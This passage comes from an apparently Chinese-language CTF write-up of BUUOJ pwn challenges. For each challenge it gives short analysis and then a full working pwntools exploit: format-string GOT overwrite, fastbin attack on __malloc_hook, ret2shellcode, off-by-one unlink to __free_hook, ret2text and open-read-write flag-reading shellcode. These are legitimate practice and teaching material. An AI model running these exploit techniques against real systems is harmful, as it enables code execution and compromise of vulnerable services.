<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25296</span>)<span class="comment">#process(&#x27;./axb_2019_fmt64&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_fmt64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_pop_r15_ret = e.search(asm(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;%9$s\x00\x00\x00\x00&#x27;</span> + p64(e.got[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_got = e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_low = sys_addr &amp; <span class="number">0xffff</span></span><br><span class="line">sys_high = (sys_addr &gt;&gt; <span class="number">16</span>)  &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(sys_high - <span class="number">9</span>).encode() + <span class="string">b&#x27;c%12$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(sys_low - sys_high).encode() + <span class="string">b&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">4</span> * <span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = fmtstr_payload(8, &#123;printf_got:sys_addr&#125;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/04/07/6yck1Kfd5aRMBFr.png" alt="image.png"></p>
<h2 id="0x053-hitcontraining-unlink-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><a href="#0x053-hitcontraining-unlink-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force" class="headerlink" title="0x053.hitcontraining_unlink - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force"></a>0x053.hitcontraining_unlink - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</h2><p>和 0x04B <strong>一  模  一  样</strong> 的题目，就不赘叙了</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29142</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + <span class="number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/FLpTbPhsGCnvrUt.png" alt="image.png"></p>
<h2 id="0x054-ciscn-2019-s-9-ret2shellcode"><a href="#0x054-ciscn-2019-s-9-ret2shellcode" class="headerlink" title="0x054.ciscn_2019_s_9 - ret2shellcode"></a>0x054.ciscn_2019_s_9 - ret2shellcode</h2><p>惯例的 <code>checksec</code>，保护全关</p>
<p><img src="https://i.loli.net/2021/04/07/HqfgXAWpiUjk1OY.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接有个溢出</p>
<p><img src="https://i.loli.net/2021/04/07/6tZ3AgBPuoizekx.png" alt="image.png"></p>
<p>有个 gadget，那就直接ret2shellcode即可</p>
<p><img src="https://i.loli.net/2021/04/07/A8WbMRVTQFJP4rN.png" alt="image.png"></p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26398</span>)<span class="comment">#process(&#x27;./ciscn_s_9&#x27;)#</span></span><br><span class="line">jmp_esp = <span class="number">0x8048554</span></span><br><span class="line">sc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = asm(sc).ljust(<span class="number">0x24</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(jmp_esp) + asm(<span class="string">&#x27;sub esp, 0x28 ; jmp esp&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/uLq9ralZIK78CB5.png" alt="image.png"></p>
<h2 id="0x055-axb-2019-heap-off-by-one-unlink"><a href="#0x055-axb-2019-heap-off-by-one-unlink" class="headerlink" title="0x055.axb_2019_heap - off by one + unlink"></a>0x055.axb_2019_heap - off by one + unlink</h2><p>惯例的<code>checksec</code>，保 护 全 开</p>
<p><img src="https://i.loli.net/2021/04/07/LzdZR8pCbBateXu.png" alt="image.png"></p>
<p>拖入IDA进行分析，可知该程序有着分配、编辑、释放堆块的功能（打印功能无效）</p>
<p><img src="https://i.loli.net/2021/04/07/3VCwPf9mHoFjOGx.png" alt="image.png"></p>
<p>开头有一个格式化字符串漏洞，可以直接利用这个泄露保存在栈上的libc相关地址（main返回值）与程序的加载地址，从而直接获得保存堆指针的地址</p>
<p><img src="https://i.loli.net/2021/04/07/xF9LPMJ3zZUHcn2.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/04/07/mwgR4uexdo9tbPD.png" alt="image.png"></p>
<p>创建堆块时限制了我们只能创建 0x80 以上的，说明这次要绕过fastbin和bins数组正面刚（</p>
<p><img src="https://i.loli.net/2021/04/07/LsZyU6khAg8ei4I.png" alt="image.png"></p>
<p>创建和编辑都存在一个 off by one 漏洞</p>
<p><img src="https://i.loli.net/2021/04/07/GDfipkOI1JL9Z3y.png" alt="image.png"></p>
<p>考虑通过 unlink 劫持 note 数组，之后就是常规流程</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25780</span>)<span class="comment">#process(&#x27;./axb_2019_heap&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">heap_array = <span class="number">0x202060</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter a size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter the content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter an index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter an index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter the content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;%15$p.%19$p&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Hello, &quot;</span>)</span><br><span class="line">    libc_base = (<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    elf_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;elf base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        new(i, <span class="number">0xf8</span>, <span class="string">b&#x27;arttnba3\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">1</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64(elf_base + heap_array - <span class="number">0x8</span>) + p64(elf_base + heap_array)).ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xf0</span>) + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(<span class="number">0x100</span>) + p64(elf_base + heap_array) + p64(<span class="number">0x100</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(<span class="number">0x100</span>) + p64(elf_base + heap_array) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/08/a2riTjb4QpodKmE.png" alt="image.png"></p>
<h2 id="0x056-mrctf2020-easy-equation-ret2text"><a href="#0x056-mrctf2020-easy-equation-ret2text" class="headerlink" title="0x056.mrctf2020_easy_equation - ret2text"></a>0x056.mrctf2020_easy_equation - ret2text</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/04/08/uYI1yXk9EVhw7Pe.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>有溢出，有后门，直接往后门溢就完事了，什么格式化字符串之类的都无关紧要（</p>
<p><img src="https://i.loli.net/2021/04/08/vBy6O9ojWlJmsEU.png" alt="image.png"></p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26947</span>)<span class="comment">#process(&#x27;./mrctf2020_easy_equation&#x27;)#</span></span><br><span class="line">backdoor = <span class="number">0x4006D0</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> + p64(backdoor) * <span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/08/y28bHUrKnWzgRFi.png" alt="image.png"></p>
<blockquote>
<p>至此，BUUOJ上Pwn方向分数为 <code>1</code> 分的题目全部完结，总计 <code>91</code> 道题目</p>
</blockquote>
<h2 id="0x057-bad-ret2shellcode"><a href="#0x057-bad-ret2shellcode" class="headerlink" title="0x057.bad - ret2shellcode"></a>0x057.bad - ret2shellcode</h2><p>惯例的 <code>checksec</code> ，保护全关</p>
<p><img src="https://i.loli.net/2021/04/19/WEtqO1JgsmdzCMP.png" alt="image.png"></p>
<p>开了沙箱，应该只能orw</p>
<p><img src="https://i.loli.net/2021/04/19/i4XTr81SupyY6WN.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有个溢出</p>
<p><img src="https://i.loli.net/2021/04/19/fR4hswvixn5KbgW.png" alt="image.png"></p>
<p>一个很贴心的gadget</p>
<p><img src="https://i.loli.net/2021/04/19/6AZCRoifMHQLuDY.png" alt="image.png"></p>
<p>写段shellcode进行orw即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28870</span>)<span class="comment">#process(&#x27;./bad&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bad&#x27;</span>)</span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">jmp_rsp = e.search(asm(<span class="string">&#x27;jmp rsp&#x27;</span>)).__next__()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1 = (asm(shellcraft.read(<span class="number">0</span>, <span class="number">0x601500</span>, <span class="number">100</span>) + <span class="string">&#x27;mov rax, 0x601500 ; jmp rax&#x27;</span>)).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;A&#x27;</span>) + p64(jmp_rsp) + asm(<span class="string">&#x27;sub rsp, 0x30 ; jmp rsp&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.read(<span class="number">0</span>, <span class="number">0x601600</span>, <span class="number">100</span>) + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x601600</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x601600</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/04/19/YmsaDi5Z1MSc6Hj.png" alt="image.png"></p>
<h2 id="0x058-picoctf-2018-leak-me-leak"><a href="#0x058-picoctf-2018-leak-me-leak" class="headerlink" title="0x058.picoctf_2018_leak_me - leak"></a>0x058.picoctf_2018_leak_me - leak</h2><p>拖入 IDA 中分析，两次连接，第一次输256字符泄漏出 password，第二次再输入 password 即可获得 flag</p>
<p><img src="https://i.loli.net/2021/05/02/vU17QASDiJu3lsB.png" alt="image.png"></p>
<p>exp 如下：</p>
